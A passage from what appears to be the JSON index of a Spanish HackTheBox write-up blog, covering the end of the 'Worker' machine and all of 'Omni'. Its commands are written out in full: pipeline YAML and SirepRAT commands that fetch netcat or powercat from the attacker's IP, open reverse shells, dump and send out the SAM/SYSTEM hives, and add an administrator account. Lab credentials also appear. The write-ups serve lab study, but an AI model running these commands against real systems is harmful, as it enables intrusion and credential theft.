pues:  [+] Drives Information  [?] Remember that you should search more info inside the other drives   C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [AppendData/CreateDirectories])  W:\ (Type: Fixed)(Volume label: Work)(Filesystem: NTFS)(Available space: 16 GB)(Permissions: Users [AppendData/CreateDirectories]):I Tenemos otro disco :(:, W:\. Veamoslo: PS C:\Windows\Temp&gt; cd w:\cd w:\PS W:\&gt; dirdir  Directory: W:\Mode        LastWriteTime     Length Name                                 ----        -------------     ------ ----                                 d-----    2020-06-16   18:59        agents                                d-----    2020-03-28   14:57        AzureDevOpsData                            d-----    2020-04-03   11:31        sites                                 d-----    2020-06-20   16:04        svnrepos                               PS W:\&gt; Enumeremos en el a ver que encontramos. PS W:\svnrepos\www\conf&gt; dirdir  Directory: W:\svnrepos\www\confMode        LastWriteTime     Length Name                                 ----        -------------     ------ ----                                 -a----    2020-06-20   11:29      1112 authz                                 -a----    2020-06-20   11:29      904 hooks-env. tmpl                            -a----    2020-06-20   15:27      1031 passwd                                -a----    2020-04-04   20:51      4454 svnserve. confRevisando el archivo passwd, tenemos: . . . nathen = wendel98 nichin = fqerfqerfnichin = asifhiefh noahip = player   . . . quehub = pickme quihud = kindasecure. . . rhiire = usersriairv = canyouricisa = seewhichrobish = onesarerobisl = wolves11robive = andwhichronkay = onesare. . . sapket = hamburgersarkil = fridayUsuarios del repositorio. Si nos fijamos tenemos a robisl = wolves11, el cual es un usuario tambien del sistema. Probemos a entrar a la pagina con ese usuario.  En este caso no podr√≠amos repetir lo que hicimos con nathen, ya que ac√° no sabemos donde est√° alojado el servicio PartsUnlimited. No tenemos dominio ni nada como para probar a ver los archivos despues de ser subidos. As√≠ que si recordamos lo que se intent√≥ al inicio de la m√°quina, cuando est√°bamos jugando a ‚Äúque hacer‚Äù como nathen, encontramos los pipeline, que con ellos podemos generar tareas que se ejecuten en el repositorio. Pero tambi√©n podemos indicarle que queremos ejecutar alg√∫n comando o tarea en el sistema:  Docs. microsoft - Azure Pipelines (Command Line Task).  Geeks. ms - Tarea personalizada Azure Pipelines.  Para hacer esto dependemos de YAML (YAML Ain‚Äôt Markup Language). B√°sicamente es un formato que permite guardar datos de manera demasiado legible. Si seguimos esta guia, logramos esto: Primero creemos el Pipeline, le indicamos que queremos que ejecute en el sistema y validamos.  Seleccionamos Azure Repos Git y despues el repositorio, en este caso PartsUnlimited: En Configure bajamos y seleccionamos Starter Pipeline: Y obtenemos nuestro archivo: Ahora podemos modificar la estructura, agreguemos una linea que nos ejecute whoami: trigger:- masterpool: 'Default'steps:- script: 'whoami'- script: echo Hello, world! displayName: 'Run a one-line script'- script: |  echo Add other tasks to build, test, and deploy your project.   echo See https://aka. ms/yaml displayName: 'Run a multi-line script'Damos clic en Save and run: Despues le indicamos que nos cree una nueva rama, ya que si intentamos hacerlo directamente en la master no nos deja y damos en Save and run, pero nos dice que no encuentra el Pool llamado Default. Validando donde encontrar que Pool‚Äôs hay en el sistema tenemos: Un Pool llamado Setup que su creador o el que lo maneja es el usuario Administrator. Lo cual es interesante porque pueda que lo que ejecutemos mediante el archivo YAML se est√© ejecutando como usuario administrador. Sigamos viendo a ver si solucionamos el error. Cambiamos simplemente: . . . pool: 'Setup'. . . Save and run &gt; Save and run‚Ä¶ Y si revisamos la tarea que se llama CmdLine tenemos la respuesta del sistema: Perfecto, tenemos ejecuci√≥n de comandos en el sistema como administrador‚Ä¶ Entablemos una reverse shell (: trigger:- masterpool: 'Setup'steps:- script: 'certutil. exe -f -urlcache -split http://10. 10. 14. 202:8000/nc. exe c:\Windows\Temp\nc. exe'- script: 'c:\Windows\Temp\nc. exe 10. 10. 14. 202 4434 -e cmd. exe'- script: echo Hello, world! displayName: 'Run a one-line script'- script: |  echo Add other tasks to build, test, and deploy your project.   echo See https://aka. ms/yaml displayName: 'Run a multi-line script' Se ejecuta la conexi√≥n para subir el binario nc. exe yyy tambien entabla la comunicaci√≥n para generar la reverse Shell‚Ä¶ Muestra cancelado, pero netcat ya hizo su tarea‚Ä¶ El cancelado es debido a que la conexi√≥n queda abierta como en ‚Äúespera‚Äù, entonces deben tener alg√∫n tipo de timeout para cancelar la tarea y que no se quede esperando alguna respuesta. Tenemos un problema, ¬øcu√°l es?‚Ä¶ Nos cierra la conexi√≥n :P (B√°sicamente desde la web podr√≠a indicarle que me muestre los hashes md5 de cada flag: user. txt y root. txt, pero quiero tener una Shell como Administrador) Estuve mucho tiempo d√°ndole, intentando, quem√°ndome la cabeza, cambiando cosas, creando branches, etc. :‚Äô) Pero no logre ejecutar la reverse Shell, intente:  con PowerShell (en YAML - powershell: . . . y junto a - script: powershell . . .  tambien /c para que apenas ejecute el comando, cierre el proceso, m√°s no la conexi√≥n.  en algunos sitios indicaban ponerle &amp; al final de la l√≠nea para hacer que la tarea se corra de fondo.  YAML tiene unos argumentos enfocados a tareas (jobs), tambien intente con ellos pero nada.  Con start y start /B para ejecutar el comando y mantenerlo en el background. Nada de nada. Pens√© en transferirme los hashes SAM y SYSTEM para posteriormente dumpearlos con pwdump y despu√©s usar pth-winexe para ingresar a la m√°quina con el usuario Administrator. Pero despu√©s de todo el proceso, los hashes presuntamente estaban mal y el pth-winexe no me daba ning√∫n output. En breves pasos lo que hice fue: trigger:- masterpool: 'Setup'steps:#Guardamos registros en archivos:- script: reg save HKLM\SAM c:\Windows\Temp\sam- script: reg save HKLM\SYSTEM c:\Windows\Temp\system#Los transferimos a nuestra maquina: (Levantamos un servidor con python y nos ponemos en escucha por dos puertos [nc -lvp 4435 &gt; sam])#Buscando y preguntando encontre esta linda herramienta (powercat):- script: powershell. exe -c  IEX(New-Object System. Net. WebClient). DownloadString('http://10. 10. 14. 202:8000/powercat. ps1');powercat -c 10. 10. 14. 202 -p 4435 -i c:\Windows\Temp\sam - script: powershell. exe -c  IEX(New-Object System. Net. WebClient). DownloadString('http://10. 10. 14. 202:8000/powercat. ps1');powercat -c 10. 10. 14. 202 -p 4436 -i c:\Windows\Temp\system #Tuvimos que ejecutar cada powercat en un pipeline diferente, el timeout no dejaba pasar de uno a otro. Con los archivos en nuestra maquina hacemos: ‚Äì¬ª pwdump sam systemAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::aaralf:1019:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::abrall:1020:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::aceals:1021:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::. . . Todos son iguales (?) (: ‚Ä¶ En este punto no sabr√≠a como obtener una Shell como el usuario nt autority\system. Probemos a crear un usuario y lo asignamos al grupo administradores mediante la web. (Tambien podemos entrar a la m√°quina mediante el puerto WinRM (5895) con el usuario robisl). ‚Äì¬ª evil-winrm -i 10. 10. 10. 203 -u 'robisl' -p 'wolves11' Evil-WinRM shell v2. 3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\robisl\Documents&gt; whoami;hostnameworker\robislWorkerAhora s√≠, intentemos agregar el usuario (: Si no me deja, podr√≠amos agregar a robisl al grupo de Administradores, pero esa idea no me gusta, igual al final les dejar√≠a la l√≠nea que deber√≠amos ejecutar).   carlitosway : casl0$3lw@y (Me di cuenta que puse caslos :P) *Evil-WinRM* PS C:\Users\robisl\Documents&gt; net user carlitoswayUser name          carlitoswayFull NameCommentUser's commentCountry/region code     000 (System Default)Account active        YesAccount expires       NeverPassword last set      2020-12-03 01:09:07Password expires       2021-01-14 01:09:07Password changeable     2020-12-03 01:09:07Password required      YesUser may change password   YesWorkstations allowed     AllLogon scriptUser profileHome directoryLast logon          NeverLogon hours allowed     AllLocal Group Memberships   *UsersGlobal Group memberships   *None*Evil-WinRM* PS C:\Users\robisl\Documents&gt; Listo, ahora lo agregamos al grupo de administradores.  Save and run &gt; Save and run: *Evil-WinRM* PS C:\Users\robisl\Documents&gt; net user carlitoswayUser name          carlitoswayFull NameCommentUser's commentCountry/region code     000 (System Default)Account active        YesAccount expires       NeverPassword last set      2020-12-03 01:09:07Password expires       2021-01-14 01:09:07Password changeable     2020-12-03 01:09:07Password required      YesUser may change password   YesWorkstations allowed     AllLogon scriptUser profileHome directoryLast logon          NeverLogon hours allowed     AllLocal Group Memberships   *Administrators    *UsersGlobal Group memberships   *None*Evil-WinRM* PS C:\Users\robisl\Documents&gt; Yyyyy ‚Äì¬ª evil-winrm -i 10. 10. 10. 203 -u 'carlitosway' -p 'casl0$3lw@y' Evil-WinRM shell v2. 3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\carlitosway\Documents&gt; whoamiworker\carlitosway*Evil-WinRM* PS C:\Users\carlitosway\Documents&gt; ls c:\Users\Administrator\Desktop  Directory: C:\Users\Administrator\DesktopMode        LastWriteTime     Length Name----        -------------     ------ -----ar---    12/2/2020  6:26 PM       34 root. txt*Evil-WinRM* PS C:\Users\carlitosway\Documents&gt;Perfectooooooooooooooooooooooooooooooooooooooo. Somos administradores del sistemaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (: Que lindooooooooooooooo‚Ä¶ Lo unico que nos queda es ver las flags: ‚Ä¶ Que locura de m√°quina, muy linda, me gusto mucho el jugar con repositorios, branch y usuarios as√≠, lindo. Hubo dos momentos en que me destru√≠, ya que no sab√≠a hacia donde mirar, pero bueno, se sobrepasaron los problemas y logramos rootearla. El poder ejecutar comandos tan f√°cil y como administradores da mucho que pensar, ¬øno?‚Ä¶ ¬øno o. O? Muchas gracias por leer y a seguir rompiendo todo (: "
    }, {
    "id": 65,
    "url": "http://localhost:4000/htb/omni",
    "title": "HackTheBox - Omni",
    "body": "2021/01/09 - M√°quina IoT nivel f√°cil. Romperemos protocolos para ejecutar comandos en el sistema, enumerando mucho tendremos credenciales, usaremos portales o. O para ejecutar comandos de nuevo. Jugaremos con la clase PSCredential de PowerShell para obtener las flags.  TL;DR (Spanish writeup): Holas, bienvenid@ a rompernos la cabeza: En esta m√°quina nos encontraremos con un dispositivo IoT Windows, el cual tiene como sistema base IoT Core, que buscando en internet nos encontramos un exploit que nos permitir√° ejecutar comandos remotamente, lo usaremos para obtener una reverse Shell. Estando dentro podremos ver las flags de user. txt y root. txt‚Ä¶ Listos, hemos terminado :P Ehhh no, no hemos terminado, las flags est√°n encriptadas, nos romperemos un poco la cabeza buscando y leyendo para al final encontrar un archivo con credenciales que nos abrir√° dos puertas en un portal o. O: Windows Device Portal, el cual nos permite gestionar nuestro dispositivo. Nos aprovecharemos de un apartado que ejecuta comandos para entablar una nueva reverse Shell, en primera medida como el usuario administrator para mediante una funci√≥n de PowerShell ver el contenido de la flag root. txt. Haremos el mismo procedimiento pero con el usuario app para ver el contenido de la flag user. txt. Sin m√°s, d√©mosle candela (:  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) adem√°s me enfoco en plasmar mis errores y exitos (por si ves mucho texto). ‚Ä¶ Fases: Tendremos 3 fases. Enumeraci√≥n, explotaci√≥n y escalada de privilegios :)  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n #: Empezaremos realizando un escaneo de puertos sobre la m√°quina para as√≠ saber que servicios est√° corriendo. ‚Äì¬ª nmap -p- --open -v -Pn 10. 10. 10. 204Pero va algo lento, agregando -T va igual, podemos agregar --min-rate y ver si va m√°s r√°pido. (Sin embargo es importante hacer un escaneo total, sin cambios, as√≠ vaya lento, que nos permita ver si obviamos/pasamos alg√∫n puerto. ‚Äì¬ª nmap -p- --open -v -Pn --min-rate=2000 10. 10. 10. 204 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -T   Forma de escanear superr√°pido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos)       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al num que pongamos       -Pn   Evita que realice Host Discovery, como ping (P) y el DNS (n)       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Wed Oct 28 10:58:58 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10. 10. 10. 204# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 204 ()  Status: UpHost: 10. 10. 10. 204 ()  Ports: 135/open/tcp//msrpc///, 5985/open/tcp//wsman///, 8080/open/tcp//http-proxy///, 29817/open/tcp/////, 29819/open/tcp///// Ignored State: filtered (65530)Obtenemos la siguiente informaci√≥n:  Puerto 135: Microsoft Remote Procedure Call Puerto 5985: WSMan Puerto 8080: Proxy web Puerto 29817: DesconocidoProcedemos a nuestro escaneo de versiones y scripts para obtener informaci√≥n m√°s detallada de cada servicio: ‚Äì¬ª nmap -p135,5985,8080,29817,29819 -sC -sV -Pn 10. 10. 10. 204 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Wed Oct 28 11:16:31 2020 as: nmap -p135,5985,8080,29817,29819 -sC -sV -Pn -oN portScan 10. 10. 10. 204Nmap scan report for 10. 10. 10. 204Host is up (0. 19s latency). PORT   STATE SERVICE VERSION135/tcp  open msrpc  Microsoft Windows RPC5985/tcp open upnp   Microsoft IIS httpd8080/tcp open upnp   Microsoft IIS httpd| http-auth: | HTTP/1. 1 401 Unauthorized\x0D|_ Basic realm=Windows Device Portal|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Site doesn't have a title. 29817/tcp open unknown29819/tcp open arcserve ARCserve DiscoveryService Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windowsOk, tenemos cositas varias:  UPNP: Universal Plug and Play (conjunto de protocolos de comunicaci√≥n que permite a perif√©ricos en la red, encontrar otros dispositivos, establecer conexiones y compartir datos).  Windows Device Portal: Plataforma que permite configurar y mantener un dispositivo remotamente sobre una red local :) arcserve: Proveedor en la protecci√≥n de datos, replicaci√≥n y recuperaci√≥n de los mismos.  Tenemos sistema operativo Windows, as√≠ que el dispositivo IoT esta sobre √©l. ‚Ä¶ Bueno pues veamos el servidor web. Puerto 8080: Si buscamos en internet nos indica que las credenciales por default para ingresar a Windows Device Portal son:  username: Administrator password: p@ssw0rdPero no nos funcionan‚Ä¶ Buscando exploits encontramos un proyecto interesante. ‚Ä¶ Explotaci√≥n #:  Herramienta SirepRAT Articulo en espa√±ol abordandola Exploit que aprovecha una vulnerabilidad del protocolo de comunicaciones Sirep/WPCon/TShell y que puede permitir a un atacante ejecutar comandos en el sistema. (HackPlayers)  WPcon (Protocolo de aplicaciones inal√°mbricas) We broke down the Sirep/WPCon protocol and demonstrated how this protocol exposes a remote command interface for attackers, that include RAT abilities such as get/put arbitrary files on arbitrary locations and obtain system information. (SirepRAT) Podemos iniciar probando que usuario somos y validar su output: ‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd  C:\Windows\System32\cmd. exe  --args   /c echo  &lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;&lt;OutputStreamResult | type: 11, payload length: 30, payload peek: 'C:\Data\Users\DefaultAccount'&gt;&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;Perfecto, tenemos ejecuci√≥n de comandos. En la fila &lt;OutputStreamResult&gt; vemos nuestra respuesta: 'C:\Data\Users\DefaultAccount'. El programa tiene la opci√≥n de ejecutar los comandos como SYSTEM (simplemente quitamos --as_logged_on_user). ‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --cmd  C:\Windows\System32\cmd. exe  --args   /c echo  &lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;&lt;OutputStreamResult | type: 11, payload length: 22, payload peek: 'C:\Data\Users\System'&gt;&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;¬øEn qu√© directorio estamos parados? ‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --cmd  C:\Windows\System32\cmd. exe  --args   /c echo %cd%  --v---------C:\windows\system32---------&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;&lt;OutputStreamResult | type: 11, payload length: 21, payload peek: 'C:\windows\system32'&gt;&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt; Con --v hacemos el t√≠pico verbose, nos sirve si queremos hacer dir para ver todo el output:‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --cmd  C:\Windows\System32\cmd. exe  --args   /c dir . . \. . \   --v--------- Volume in drive C is MainOS Volume Serial Number is 3C37-C677 Directory of C:\07/20/2020 02:36 AM  &lt;DIR&gt;     $Reconfig$10/26/2018 11:35 PM  &lt;JUNCTION&gt;   Data [\??\Volume{ac55f613-7018-45c7-b1e9-7ddda60262fd}\]10/26/2018 11:37 PM  &lt;DIR&gt;     Program Files10/26/2018 11:38 PM  &lt;DIR&gt;     PROGRAMS10/26/2018 11:37 PM  &lt;DIR&gt;     SystemData10/26/2018 11:37 PM  &lt;DIR&gt;     Users07/03/2020 10:35 PM  &lt;DIR&gt;     Windows        0 File(s)       0 bytes        7 Dir(s)   584,499,200 bytes free---------&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;&lt;OutputStreamResult | type: 11, payload length: 584, payload peek: ' Volume in drive C is MainOS Volume Serial Numbe'&gt;&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;Vemos la estructura ra√≠z del sistema‚Ä¶ Perfecto, intentemos subir el binario netcat para entablarnos una reverse Shell y estar m√°s c√≥modos: Recientemente vimos una ruta hacia C:\Data\Users\DefaultAccount, podemos usarla para subir el binario. Primero montamos un servidor web con Python donde este nc. exe: ‚Äì¬ª python3 -m http. server‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --cmd  C:\Windows\System32\cmd. exe  --args   /c powershell IWR -uri http://10. 10. 15. 30:8000/nc. exe -OutFile C:\Data\Users\DefaultAccount\nc. exe Validamos: ‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --cmd  C:\Windows\System32\cmd. exe  --args   /c dir C:\Data\Users\DefaultAccount  --v--------- Volume in drive C is MainOS Volume Serial Number is 3C37-C677 Directory of C:\Data\Users\DefaultAccount10/29/2020 09:25 PM  &lt;DIR&gt;     . 10/29/2020 09:25 PM  &lt;DIR&gt;     . . 07/03/2020 11:22 PM  &lt;DIR&gt;     3D Objects07/03/2020 11:22 PM  &lt;DIR&gt;     Documents07/03/2020 11:22 PM  &lt;DIR&gt;     Downloads07/03/2020 11:22 PM  &lt;DIR&gt;     Favorites07/03/2020 11:22 PM  &lt;DIR&gt;     Music10/29/2020 10:21 PM      45,272 nc. exe07/03/2020 11:22 PM  &lt;DIR&gt;     Pictures07/03/2020 11:22 PM  &lt;DIR&gt;     Videos        1 File(s)     45,272 bytes        9 Dir(s)  4,692,344,832 bytes free---------&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;&lt;OutputStreamResult | type: 11, payload length: 688, payload peek: ' Volume in drive C is MainOS Volume Serial Numbe'&gt;&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;Nos ponemos en escucha (nc -nvlp 4433) y ejecutamos: ‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --cmd  C:\Windows\System32\cmd. exe  --args   /c C:\Data\Users\DefaultAccount\nc. exe 10. 10. 15. 30 4433 -e cmd. exe  --vAc√° tenemos problemas con la versi√≥n de nc. exe, as√≠ que descargaremos las 2 y probaremos con las 2‚Ä¶ Volvemos a subir la de 32 Bits, pero no funciona, probemos con la de 64 :) ‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --cmd  C:\Windows\System32\cmd. exe  --args   /c powershell IWR -uri http://10. 10. 15. 30:8000/nc64. exe -OutFile C:\Data\Users\DefaultAccount\nc64. exe Validemos de una: ‚Äì¬ª python SirepRAT/SirepRAT. py 10. 10. 10. 204 LaunchCommandWithOutput --return_output --cmd  C:\Windows\System32\cmd. exe  --args   /c C:\Data\Users\DefaultAccount\nc64. exe 10. 10. 15. 30 4433 -e cmd. exe  --v Perfecto, tamos dentro :) veamos que m√°s nos encontramos. ‚Ä¶ Escalada de privilegios #: Encontramos varios archivos, podemos ver root. txt y user. txt, pero est√°n encriptados mediante la clase System. Management. Automation. PSCredential.  user. txt: &lt;Objs Version= 1. 1. 0. 1  xmlns= http://schemas. microsoft. com/powershell/2004/04 &gt; &lt;Obj RefId= 0 &gt;  &lt;TN RefId= 0 &gt;   &lt;T&gt;System. Management. Automation. PSCredential&lt;/T&gt;   &lt;T&gt;System. Object&lt;/T&gt;  &lt;/TN&gt;  &lt;ToString&gt;System. Management. Automation. PSCredential&lt;/ToString&gt;  &lt;Props&gt;   &lt;S N= UserName &gt;flag&lt;/S&gt;   &lt;SS N= Password &gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&lt;/SS&gt;  &lt;/Props&gt; &lt;/Obj&gt;&lt;/Objs&gt;Buscando y leyendo durante bastante tiempo, intentando solucionar problemas, desencriptar y quebr√°ndome la cabeza‚Ä¶ Nelson, no pudimos as√≠ que me sent√≠ superperdido sin saber que hacer y me fui para el foro. Curiosamente muchas personas tambi√©n se hab√≠an estancado ah√≠, los dem√°s indicaban que era necesario encontrar otro archivo en el que van a haber cosas bonitas‚Ä¶ Leyendo como podemos apoyarnos de PowerShell para buscar objetos r√°pidamente encontr√© esta manera:  Buscar de manera recursiva PowerShell.  ‚Ä¶ y exclusiva. # Guardamos el a√±o en una variable$date = Get-Date -Year 2019# Le indicamos que busque en la ruta actual (**. **), donde nos muestre los archivos ocultos (**-force**), entre y busque en cada carpeta (**-recurse**) y tenga una fecha mayor o igual a la variable que guardamosGet-ChildItem -Path . -force | Where-Object { $_. LastWriteTime -ge $date }Con esto estuve rondando algunas carpetas, hasta que busque en la misma relacionada con PowerShell, situada en: C:\Program Files\WindowsPowerShell.  Encontramos este archivo llamado r. bat, que quieras o no parece sospechoso, por la fecha y por su nombre, veamos si encontramos algo ah√≠. PS C:\Program Files&gt; type  C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r. bat @echo off:LOOPfor /F  skip=6  %%i in ('net localgroup  administrators ') do net localgroup  administrators  %%i /deletenet user app mesh5143net user administrator _1nt3rn37ofTh1nGzping -n 3 127. 0. 0. 1clsGOTO :LOOP:EXITPS C:\Program Files&gt;Vemos los dos usuarios a los que les encontramos sus respectivas flags: administrator y app. Con lo que parecen ser contrase√±as, podemos probar mediante el portal que nos encontramos en el puerto 8080 y con WinRM.  app : mesh5143 administrator : _1nt3rn37ofTh1nGzMediante WinRM no podemos acceder, probando con el portal y con las credenciales de administrador, logramos entrar: Dandole una pasada vemos un apartado donde podemos ingresar comandos en el sistema. Al estar como administrador, podemos ejecutar las instrucciones como √©l.  Veamos la diferencia entre SYSTEM y ADMINISTRATOR: # Sesi√≥n que tenemos actualmente. C:\Data\Users\app&gt;echo %userprofile%C:\Data\Users\System# Arbol de archivos en el que tenemos `hardening. txt`, al cual no podemos acceder. C:\Data\Users\app&gt;dir Volume in drive C is MainOS Volume Serial Number is 3C37-C677 Directory of C:\Data\Users\app07/04/2020 08:53 PM  &lt;DIR&gt;     . 07/04/2020 08:53 PM  &lt;DIR&gt;     . . 07/04/2020 06:28 PM  &lt;DIR&gt;     3D Objects07/04/2020 06:28 PM  &lt;DIR&gt;     Documents07/04/2020 06:28 PM  &lt;DIR&gt;     Downloads07/04/2020 06:28 PM  &lt;DIR&gt;     Favorites07/04/2020 07:20 PM        344 hardening. txt07/04/2020 07:14 PM       1,858 iot-admin. xml07/04/2020 06:28 PM  &lt;DIR&gt;     Music07/04/2020 06:28 PM  &lt;DIR&gt;     Pictures07/04/2020 08:53 PM       1,958 user. txt07/04/2020 06:28 PM  &lt;DIR&gt;     Videos        3 File(s)     4,160 bytes        9 Dir(s)  4,690,558,976 bytes freeC:\Data\Users\app&gt;type hardening. txttype hardening. txtAccess is denied. Ahora juguemos con el portal: Command&gt; echo %userprofile%C:\Data\Users\administrator Perfecto, pues intentemos obtener una reverse Shell mediante el portal: Listos, tamos como administrator, veamos si ahora si podemos jugar con las flags :P De las b√∫squedas y lecturas que ya hab√≠a hecho, encontr√© este comando que toma la estructura del archivo y la convierte en un objeto del sistema, del cual podemos ver el usuario y contrase√±a que tenga asignada: $credential = Import-CliXml -Path &lt;PathToXml&gt;\MyCredential. xml Save and read sensitive data with PowerShellEntonces podemos usar esto para validar:  user. txt root. txt iot-admin. xmlTambi√©n de la lectura previa entend√≠ que si no somos el propietario del archivo, lo m√°s probable es que obtengamos alg√∫n tipo de error, en nuestro caso al intentar jugar con user. txt y iot-admin. xml, obtenemos: PS c:\Data\Users\app&gt; $credential = Import-CliXml -Path c:. . user. txtImport-CliXml : Error occurred during a cryptographic operation. At line:1 char:15+ $credential = Import-CliXml -Path c:. . user. txt+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  + CategoryInfo     : NotSpecified: (:) [Import-Clixml], Cryptographic  Exception  + FullyQualifiedErrorId : System. Security. Cryptography. CryptographicExcept  ion,Microsoft. PowerShell. Commands. ImportClixmlCommandEl tema es que el algoritmo est√° apoyado en una llave √∫nica de cada usuario y pues al ser nosotros administrator, no tenemos la llave de app, que ser√≠a el usuario que puede manejar user. txt, puedes encontrar m√°s info ac√° y ac√°. Entonces probemos con root. txt: Perfecccccccto, tenemos el hash MD5 que piden en HTB, solo nos queda pasarnos al usuario app y ver la flag user. txt. (Tengo la impresi√≥n que hice el proceso al rev√©s, con lo que sigue lo confirmo o me retracto :P) Hacemos el mismo procedimiento que con el usuario administrator. Entramos al portal y mediante la ejecuci√≥n de comandos le decimos que nos haga una reverse Shell como app‚Ä¶  Realmente no creo que sean necesarias las reverse shell, ya que podemos ejecutar la linea desde el mismo portal, pero yo que se, me gusta :) Command&gt; echo %userprofile%Command&gt; c:\Data\Users\DefaultAccount\nc64. exe 10. 10. 14. 188 4435 -e cmd. exeAccess is denied. Muy bien, entonces movamos el binario a una carpeta de la que sea propietario el usuario app. Lo hice con la sesi√≥n que ten√≠a abierta de SYSTEM, cerr√© la de administrator :( Lo movemos a c:\Data\Users\app\Videos y despues en el portal: c:\Data\Users\app\Videos\nc64. exe 10. 10. 14. 188 4435 -e cmd. exeVeamos la flag de user. txt: Bien, ahora quiero probar si hice todo al rev√©s o si daba igual &lt;&gt;_&lt;&gt; PS C:\Data\Users\app&gt; $credential = Import-CliXml -Path c:\Data\Users\app\iot-admin. xmlPS C:\Data\Users\app&gt; $credential. GetNetworkCredential(). UsernameadministratorPS C:\Data\Users\app&gt; $credential. GetNetworkCredential(). Password_1nt3rn37ofTh1nGzPS C:\Data\Users\app&gt; Entiendo que daba igual, ya que con esta contrase√±a entrabamos al portal, pero como el usuario administrador‚Ä¶ Algo raro es que en el archivo r. bat no s√© por qu√© no estaban solo las credenciales del usuario app, para que iot-admin. xml tomara valor‚Ä¶ Muy extra√±o. ‚Ä¶ Pero listos, hemos terminado con esta m√°quina, la verdad, sencilla. Un poco desesperante el encontrar el archivo r. bat, pero bueno, de eso se trata la enumeraci√≥n. Hicimos el camino al rev√©s, pero llegamos al mismo sitio, as√≠ que todo perfecto. Muchas gracias por leer y a seguir rompiendo todo (: "
    }, {
    "id": 66,
    "url": "http://localhost:4000/htb/unbalanced",
    "title": "HackTheBox - Unbalanced",
